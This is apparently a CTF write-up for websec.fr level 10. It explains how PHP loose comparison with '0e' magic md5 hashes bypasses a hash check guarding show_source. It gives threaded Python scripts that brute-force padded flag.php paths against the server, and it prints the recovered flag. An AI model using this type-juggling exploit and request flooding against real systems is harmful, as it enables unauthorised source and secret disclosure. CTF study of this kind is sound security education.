Hint:
> Integrity without knowledge is weak and useless, and knowledge without integrity is dangerous and dreadful.

```PHP
<?php  
if (isset ($_REQUEST['f']) && isset ($_REQUEST['hash'])) {  
    $file = $_REQUEST['f'];  
    $request = $_REQUEST['hash'];  
  
    $hash = substr (md5 ($flag . $file . $flag), 0, 8);  
  
    echo '<div class="row"><br><pre>';  
    if ($request == $hash) {  
        show_source ($file);  
    } else {  
        echo 'Permission denied!';  
    }  
    echo '</pre></div>';  
}  
?>
```

```PHP
$hash = substr (md5 ($flag . $file . $flag), 0, 8);
```

### Directions
1. Vulnerable hash:
	- make `file` an array so `md5` would type juggle it to be an empty string - therefore the hash would be `substr(md5 ($flag . $flag), 0, 8);` - same every time, then break it with requests

2. Saw this in the `md5` php function docs:
> `md5('240610708') == md5('QNKCDZO')`
> This comparison is true because both md5() hashes start '0e' so PHP type juggling understands these strings to be scientific notation.  By definition, zero raised to any power is zero.

- Insert `requested_hash` to be 0e1 (0 after type juggling), and make the md5 hash start with 0e somehow
- `flag.php` can be inserted to `f` with dots and slashes - so let's try to bruteforce it:


```python
from time import sleep  
  
import requests  
  
def main():  
    counter = 1  
    while True:  
        response = requests.get(  
            r"http://websec.fr/level10/index.php?hash=0e1&f=" +  
            "." + "/" * counter + "flag.php"  
        )  
        if "WEBSEC" in response.text:  
            print(f"Found!\n{response.text}")  
        else:  
            counter += 1  
            print("...")  
  
        sleep(0.1)  
  
  
if __name__ == '__main__':  
    main()
```
This ran for 500 requested an didn't seem to work, but the directions seems correct. let's spam the server:
```python
import random  
import sys  
import threading  
  
import requests  
  
  
def worker(base_url, start, worker_diff, backwards = False):  
    end = start - worker_diff if backwards else start + worker_diff  
    step = -1 if backwards else 1  
    for counter in range(start, end, step):  
        response = requests.get(base_url + "." + "/" * counter + "flag.php", timeout=5)  
  
        if "WEBSEC" in response.text:  
            print(f"\nFOUND in {counter}!\n")  
            print(response.text)  
            return  
        else:  
            print(f"[w-{start}] >>> {counter}")  
  
  
def main():  
    threads = []  
    diff = 100  
  
    for i in range(10):  
        start = i * diff  
        t = threading.Thread(  
            target=worker,  
            args=(  
                r"http://websec.fr/level10/index.php?hash=0e1&f=",  
                start,  
                diff,  
                bool(random.randint(0, 1))  
            )  
        )  
        threads.append(t)  
        t.start()  
  
    # wait for all threads  
    for t in threads:  
        t.join()  
  
  
if __name__ == "__main__":  
    main()
```

`FOUND in 881!`

# Solution
```
WEBSEC{Lose_typ1ng_system_are_super_great_aren't_them?}
```